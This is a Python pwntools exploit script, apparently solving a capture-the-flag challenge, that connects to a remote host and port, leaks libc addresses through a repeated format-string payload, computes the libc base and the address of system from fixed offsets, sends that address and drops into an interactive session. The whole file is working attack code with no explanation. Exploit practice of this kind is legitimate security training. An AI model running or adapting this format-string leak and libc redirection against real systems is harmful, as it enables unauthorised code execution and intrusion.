#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('look_at_me.elf')

host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11631)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil(b'Payload: ')
pl = b'\x25\x70\x70'        # %pp
io.sendline(pl*13)          # %pp%pp%pp%pp...

io.recvuntil(b'Hmmm...\n')
data = io.recvline()[:-2]   # 0x7ff..11p0x7ff..22p0x7ff..33p0x7ff..44p...
data = data.split(b'p')     # [0x7ff..11, 7ff..22, 7ff..33, 7ff..44, ...]

PRINTF_addr = int(data[12].decode(), 16)
FGETS_addr = int(data[11].decode(), 16)
STRTOL_addr = int(data[10].decode(), 16)
# print("printf", hex(PRINTF_addr))
# print("fgets", hex(FGETS_addr))
# print("strtol", hex(STRTOL_addr))

PRINTF_offs = 0x064e10
LIBC_BASE = PRINTF_addr - PRINTF_offs
SYSTEM_offs = 0x055410

io.recvuntil(b'Address (as hex): ')
io.sendline( hex(LIBC_BASE + SYSTEM_offs)[2:].encode() )

io.interactive()

